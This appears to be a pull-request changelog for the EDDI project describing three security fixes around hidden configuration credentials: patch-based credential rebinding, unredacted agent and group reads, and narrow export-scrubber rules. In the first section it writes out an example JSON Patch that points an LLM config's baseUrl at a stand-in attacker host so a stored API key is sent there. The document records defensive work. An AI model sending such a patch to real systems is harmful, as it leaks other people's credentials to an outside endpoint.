## 🔒 fix(security): close three gaps around hidden configuration credentials (2026-11-11)

**Repo:** EDDI (`fix/config-credential-redaction-gaps`)

### What changed and why

**1. JSON Patch could rebind a hidden literal credential to another host (high).** A patch by
anyone but `eddi-admin` masks every plaintext credential and puts it back where its token still
sits, but nothing looked at the fields around it. An editor could send
`[{"op":"add","path":"/tasks/0/parameters/baseUrl","value":"https://attacker.example/v1"}]` to an
LLM config holding a literal `apiKey` (or change `/targetServerUrl` on an httpcalls config with a
literal `Authorization` header): the key was kept and the next turn sent it to the editor's
endpoint. `ConfigJsonPatcher` now compares, for every hidden literal it restores, each enclosing
object before and after the patch and answers `400` naming the changed field (never the value)
when a destination field was added, removed or modified. The two documents are paired through the
credential's token, so an `add` that shifts array indices compares the right objects; a credential
that cannot be paired (different depth or ancestor kind) is refused. Vault references are not
hidden and are not affected; administrators are not affected. Every store with JSON Patch (LLM,
httpcalls, MCP calls) goes through `RestVersionInfo.patch`, so all are covered.

The destination rule moved out of `ScrubbedSecrets` into a shared
`secrets/sanitize/CredentialDestinations`, used by both the upgrade restore and the patcher. It
now also treats a changed `type`, `*provider`, `port` or `useTls` as a destination change (1b): an
upgrade that kept the `apiKey` placeholder but changed the provider `type` had the target's key
restored and sent to the other vendor's default endpoint.

**2. Agent and group configs returned literal credentials to editors (medium).**
`GET /agentstore/agents/{id}` and `GET /groupstore/groups/{id}` (and the MCP `get_agent`,
`list_agent_resources`, `read_group` tools, which read through them) now redact for non-admins with
`ConfigSecretRedactor`, covering `userMemoryConfig.dream.parameters`, legacy `channels[].config`
(`botToken`, `signingSecret`) and `lessonConfig.consolidation.parameters` — the existing name rules
already match those fields. Both types joined `RedactionMarkerGuard`, and create, update and
duplicate refuse the marker. Server-side work that writes an agent back reads it unredacted with
the same access check (`RestAgentStore.readUnredacted`): `updateResourceInAgent`,
`AgentCascadeService`, `ApiAgentSyncService`, `StructuralMatcher` and `UpgradeExecutor`. The engine
(`DreamService`, `ChannelTargetRouter`, `LessonConsolidationService`, group discussions) reads
`IAgentStore` / `IAgentGroupStore` directly and is unchanged. Agents and groups have no JSON Patch
endpoint, so the patch part of the brief does not apply to them. Literal dream keys are still
accepted at save, with a warning naming the path, so stored agents keep saving; a NEW literal in
the group consolidation parameters is refused at save like a SERVICE judge's, while a literal the
stored version already holds under the same key is carried over. Workflow step `config` maps carry
a resource `uri` and task flags only; no step type reads a credential from them, so workflows were
left alone.

**3. The export scrubber's name rules were narrower than the read redactor's (medium).**
`SecretScrubber.isSecretFieldName` now also answers true for `ConfigSecretRedactor.isCredentialName`
and, inside a `queryParams` map, `isCredentialQueryName`, so `parameters.nonAzureApiKey =
"my-litellm-master-key"` is no longer redacted on GET and exported in clear. A parity test walks
the redactor's name sets. The `scrubJson` failure mode and the bearer rule (open PR #1338) were not
touched.

### Design decisions

- Refuse rather than drop the credential: a patch that changes the destination next to a hidden
  literal gets a `400`, and the editor can replace or remove the credential in the same patch.
- A URL counts by its origin, so a different path on the same host is not a change.
- Group consolidation literals are refused only when new, so no stored group becomes unsavable.

**Files:** [`ConfigJsonPatcher.java`](../../src/main/java/ai/labs/eddi/configs/patch/ConfigJsonPatcher.java),
[`CredentialDestinations.java`](../../src/main/java/ai/labs/eddi/secrets/sanitize/CredentialDestinations.java),
[`ScrubbedSecrets.java`](../../src/main/java/ai/labs/eddi/backup/impl/ScrubbedSecrets.java),
[`RestAgentStore.java`](../../src/main/java/ai/labs/eddi/configs/agents/rest/RestAgentStore.java),
[`RestAgentGroupStore.java`](../../src/main/java/ai/labs/eddi/configs/groups/rest/RestAgentGroupStore.java),
[`AgentGroupStore.java`](../../src/main/java/ai/labs/eddi/configs/groups/mongo/AgentGroupStore.java),
[`ServiceJudgeValidation.java`](../../src/main/java/ai/labs/eddi/configs/groups/validation/ServiceJudgeValidation.java),
[`RedactionMarkerGuard.java`](../../src/main/java/ai/labs/eddi/configs/rest/RedactionMarkerGuard.java),
[`SecretScrubber.java`](../../src/main/java/ai/labs/eddi/secrets/sanitize/SecretScrubber.java),
[`security.md`](../security.md), [`secrets-vault.md`](../secrets-vault.md)
